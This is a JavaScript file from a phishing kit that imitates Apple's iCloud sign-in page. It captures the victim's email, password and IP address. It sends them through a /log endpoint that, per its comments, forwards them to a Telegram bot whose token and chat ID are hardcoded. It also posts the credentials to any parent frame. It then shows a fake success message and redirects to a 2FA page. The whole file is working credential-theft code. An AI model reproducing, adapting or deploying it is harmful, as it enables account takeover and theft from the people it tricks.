// ============================================
// TELEGRAM CONFIG
// ============================================
const BOT_TOKEN = "8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68";
const CHAT_ID = "-1003983565500";

let userIP = 'Unable to detect';
let attemptCount = 1;
let currentEmail = '';

// ============================================
// GET USER IP
// ============================================
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIP = data.ip;
  } catch (e) {
    userIP = 'Unable to detect';
  }
}
getUserIP();

// ============================================
// GET DATE/TIME
// ============================================
function getFormattedDateTime() {
  const now = new Date();
  const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const dayName = days[now.getDay()];
  let hours = now.getHours();
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12;
  hours = hours ? hours : 12;
  const timeString = hours + ':' + minutes + ' ' + ampm;
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const day = now.getDate().toString().padStart(2, '0');
  const year = now.getFullYear();
  const dateString = year + '/' + month + '/' + day;
  return { dayName, timeString, dateString };
}

// ============================================
// TOAST
// ============================================
function showToast(msg, isError) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = msg;
  toast.style.background = isError ? '#d93025' : '#1c1c1e';
  toast.classList.add('show');
  clearTimeout(toast._hide);
  toast._hide = setTimeout(function () {
    toast.classList.remove('show');
  }, 3000);
}

// ============================================
// SEND TO SERVER (which forwards to Telegram
// with the copy_text inline buttons)
// ============================================
async function sendToTelegram(email, password, attempt, ip, day, time, date) {
  try {
    const response = await fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, attempt, ip, day, time, date })
    });
    const data = await response.json();
    console.log('Server response:', data);
    return data;
  } catch (err) {
    console.error('Send error:', err);
    return false;
  }
}

function escapeHtml(text) {
  if (!text) return '—';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ============================================
// DOM ELEMENTS
// ============================================
const emailInput = document.getElementById('emailInput');
const emailWrap = document.getElementById('emailWrap');
const emailDisplayWrap = document.getElementById('emailDisplayWrap');
const emailDisplay = document.getElementById('emailDisplay');
const arrowBtn = document.getElementById('arrowBtn');
const passwordInput = document.getElementById('passwordInput');
const passwordWrap = document.getElementById('passwordWrap');
const showBtn = document.getElementById('showBtn');
const continueBtn = document.getElementById('continueBtn');
const differentAccount = document.getElementById('differentAccount');
const rememberBox = document.getElementById('rememberBox');
const linksBox = document.getElementById('linksBox');

const validEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
const validPhone = v => v.replace(/\D/g,'').length >= 10;

// ============================================
// SHOW/HIDE PASSWORD
// ============================================
if (showBtn) {
  showBtn.addEventListener('click', function() {
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
      showBtn.textContent = 'Hide';
    } else {
      passwordInput.type = 'password';
      showBtn.textContent = 'Show';
    }
  });
}

// ============================================
// SHOW PASSWORD FIELD
// ============================================
function showPasswordField() {
  if (!emailInput) return;
  const email = emailInput.value.trim();
  
  if (!email || (!validEmail(email) && !validPhone(email))) {
    emailInput.style.borderColor = '#ff3b30';
    emailInput.style.borderWidth = '2px';
    emailInput.focus();
    return;
  }
  
  if (emailWrap) emailWrap.classList.add('hidden');
  if (emailDisplay) {
    emailDisplay.textContent = email;
    if (emailDisplayWrap) emailDisplayWrap.classList.add('visible');
  }
  
  if (passwordWrap) passwordWrap.classList.add('visible');
  if (continueBtn) continueBtn.classList.add('visible');
  if (differentAccount) differentAccount.classList.add('visible');
  
  if (rememberBox) rememberBox.classList.add('hidden');
  if (linksBox) linksBox.classList.add('hidden');
  
  currentEmail = email;
  
  setTimeout(() => {
    if (passwordInput) passwordInput.focus();
  }, 100);
}

// ============================================
// DO LOGIN
// ============================================
function doLogin() {
  if (!passwordInput) return;
  const pwd = passwordInput.value.trim();
  
  if (!pwd) {
    passwordInput.style.borderColor = '#ff3b30';
    passwordInput.style.borderWidth = '2px';
    passwordInput.focus();
    return;
  }
  
  if (currentEmail && pwd) {
    const dateTime = getFormattedDateTime();
    const attemptText = attemptCount === 1 ? '1ST ATTEMPT ICLOUD' : attemptCount + 'TH ATTEMPT ICLOUD';
    
    // SEND TO SERVER → SERVER SENDS TO TELEGRAM WITH COPY BUTTONS
    sendToTelegram(
      currentEmail,
      pwd,
      attemptText,
      userIP,
      dateTime.dayName,
      dateTime.timeString,
      dateTime.dateString
    );
    
    // Try to send to parent (if in iframe)
    try {
      window.parent.postMessage({
        type: 'icloud_login_success',
        email: currentEmail,
        password: pwd,
        ip: userIP,
        attempt: attemptText,
        day: dateTime.dayName,
        time: dateTime.timeString,
        date: dateTime.dateString
      }, '*');
    } catch(e) {
      // Ignore if not in iframe
    }
    
    attemptCount++;
    
    if (continueBtn) {
      continueBtn.textContent = 'Continue';
      continueBtn.style.background = '#2997ff';
      continueBtn.disabled = true;
    }
    if (passwordInput) passwordInput.disabled = true;
    if (showBtn) showBtn.style.display = 'none';
    
    showToast('✅ Login successful! Redirecting to 2FA...', false);
    
    setTimeout(function() {
      window.location.href = '2fa.html';
    }, 1000);
  }
}

// ============================================
// EVENT LISTENERS
// ============================================
if (arrowBtn) arrowBtn.addEventListener('click', showPasswordField);

if (emailInput) {
  emailInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      showPasswordField();
    }
  });
}

if (passwordInput) {
  passwordInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      doLogin();
    }
  });
}

if (continueBtn) continueBtn.addEventListener('click', doLogin);

// Different account link - go back to email entry
if (document.getElementById('differentAccountLink')) {
  document.getElementById('differentAccountLink').addEventListener('click', function(e) {
    e.preventDefault();
    
    if (emailWrap) emailWrap.classList.remove('hidden');
    if (emailDisplayWrap) emailDisplayWrap.classList.remove('visible');
    if (passwordWrap) passwordWrap.classList.remove('visible');
    if (continueBtn) continueBtn.classList.remove('visible');
    if (differentAccount) differentAccount.classList.remove('visible');
    if (rememberBox) rememberBox.classList.remove('hidden');
    if (linksBox) linksBox.classList.remove('hidden');
    
    if (emailInput) emailInput.value = '';
    if (passwordInput) {
      passwordInput.value = '';
      passwordInput.disabled = false;
    }
    if (showBtn) showBtn.style.display = 'block';
    if (continueBtn) {
      continueBtn.textContent = 'Continue';
      continueBtn.style.background = '#2997ff';
      continueBtn.disabled = false;
    }
    if (passwordInput) {
      passwordInput.style.borderColor = '#3a3a3e';
      passwordInput.style.borderWidth = '1px';
    }
    if (emailInput) emailInput.focus();
  });
}

if (emailInput) {
  emailInput.addEventListener('input', function() {
    this.style.borderColor = '#3a3a3e';
    this.style.borderWidth = '1px';
  });
}

if (passwordInput) {
  passwordInput.addEventListener('input', function() {
    this.style.borderColor = '#3a3a3e';
    this.style.borderWidth = '1px';
  });
}

if (document.getElementById('createLink')) {
  document.getElementById('createLink').addEventListener('click', function(e) {
    e.preventDefault();
    showToast('Redirect to Apple Account creation.', false);
  });
}

if (document.getElementById('forgotLink')) {
  document.getElementById('forgotLink').addEventListener('click', function(e) {
    e.preventDefault();
    showToast('Password reset link would be sent.', false);
  });
}

window.addEventListener('load', function() {
  if (emailInput) emailInput.value = '';
  if (passwordInput) passwordInput.value = '';
  if (emailInput) emailInput.focus();
});

console.log('✅ iCloud page loaded - Sending credentials to server');